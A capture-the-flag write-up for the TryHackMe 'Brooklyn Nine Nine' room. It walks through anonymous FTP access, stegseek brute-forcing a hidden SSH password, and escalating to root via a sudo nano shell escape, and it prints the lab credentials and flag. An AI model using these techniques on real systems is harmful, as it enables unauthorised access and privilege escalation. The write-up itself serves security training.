---
title: 'TryHackMe - Brooklyn Nine Nine'
author: r2cook
categories: [TryHackMe]
tags: [ftp, ssh, Steganography, stegseek, PrivEsc, GTFOBins, nano]
render_with_liquid: false
media_subpath: /images/thm/Brooklyn-Nine-Nine/
image:
  path: room_card.jpeg
---

> In this write-up, we compromise the target by chaining **anonymous FTP enumeration, HTML source-code analysis, and image steganography** to recover valid SSH credentials for `holt`.
> After gaining a foothold, we leverage a dangerously misconfigured **NOPASSWD sudo rule on `nano`** and abuse a well-known **GTFOBins technique** to escalate directly to root.
>
> This room is an excellent beginner-friendly example of how **small information leaks across multiple services** can combine into a full system compromise.

## Initial Setup

Add the target hostname to your hosts file:

```plaintext
10.129.153.220 brooklyn99.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

We begin with a full TCP scan to identify all exposed services:

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt brooklyn99.thm
```
{: .nolineno }

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-01 06:44 EET
Nmap scan report for brooklyn99.thm (10.129.153.220)
Host is up (0.072s latency).
Not shown: 65532 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
|_-rw-r--r--    1 0 0 119 May 17 2020 note_to_jake.txt

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
{: .nolineno }

### Key Findings

Three interesting services are exposed:

- **FTP (Anonymous access enabled)**
    
- **SSH**
    
- **HTTP web server**
    

The anonymous FTP service is the most promising initial foothold.

---

## FTP Anonymous Login

Connecting with anonymous credentials works immediately:

```shell
ftp brooklyn99.thm
```
{: .nolineno }

```shell
Name: anonymous
Password:
230 Login successful.
```
{: .nolineno }

Enumerating the FTP share reveals a note:

```shell
ls -la
get note_to_jake.txt
cat note_to_jake.txt
```
{: .nolineno }

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

### Intelligence Gained

This gives us **three valid usernames**:

- `amy`
    
- `jake`
    
- `holt`
    

These names are useful for:

- SSH brute force
    
- Web login guessing
    
- Password spraying
    
- Steganography password candidates
    

---

## Web Enumeration

Visiting port **80** shows a static web page.

![[THM/Brooklyn Nine Nine/images/web_portal_enum_80.webp]]

Viewing the page source reveals an interesting hidden comment:

![web portal 80 page source](web_portal_page_source_80.webp){: width="800" height="400" .shadow }

```html
<!-- Have you ever heard of steganography? -->
```

This strongly hints that the **background image contains hidden data**.

---

## Steganography Analysis

Download the image from the web server:

```shell
wget http://brooklyn99.thm/brooklyn99.jpg
```
{: .nolineno }

![wget BK image](wget_bk_image.webp){: width="800" height="400" .shadow }


Now use **StegSeek** with `rockyou.txt` to brute-force the embedded passphrase:

```shell
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

```shell
[i] Found passphrase: "admin"
[i] Original filename: "note.txt"
[i] Extracting to "brooklyn99.jpg.out"
```
{: .nolineno }

Extracted contents:

```shell
cat brooklyn99.jpg.out
```
{: .nolineno }

```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

![extracting data from the image](extracting_data_from_the_image.webp){: width="800" height="400" .shadow }


### Credential Discovery

We now have valid SSH credentials:

- **Username:** `holt`
    
- **Password:** `fluffydog12@ninenine`
    

---

## Initial Access via SSH

Use the discovered credentials to log in:

```shell
ssh holt@brooklyn99.thm
```
{: .nolineno }

After successful authentication:

```shell
id
ls -lah
cat user.txt
```
{: .nolineno }

```shell
uid=1002(holt) gid=1002(holt) groups=1002(holt)
```
{: .nolineno }

```text
ee11cbb19052e40b07aac0ca060c23ee
```

**User flag captured**

![foothold](foothold.webp){: width="800" height="400" .shadow }

---

## Privilege Escalation (PrivEsc)

Check sudo permissions:

![sudo -l](sudo_l.webp){: width="800" height="400" .shadow }

```shell
sudo -l
```
{: .nolineno }

```shell
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
{: .nolineno }

This is a direct **GTFOBins privilege escalation vector**.

Since `nano` can spawn subshells, we can escalate to root instantly.

![gtfobins nano](gtfobins_nano.webp){: width="800" height="400" .shadow }

Launch nano as sudo:

```shell
sudo nano
```
{: .nolineno }

Inside nano press:

```text
CTRL+R
CTRL+X
```

Then execute:

```shell
reset; sh 1>&0 2>&0
```
{: .nolineno }

This spawns a **root shell**.

![PrivEsc](PrivEsc.webp){: width="800" height="400" .shadow }

---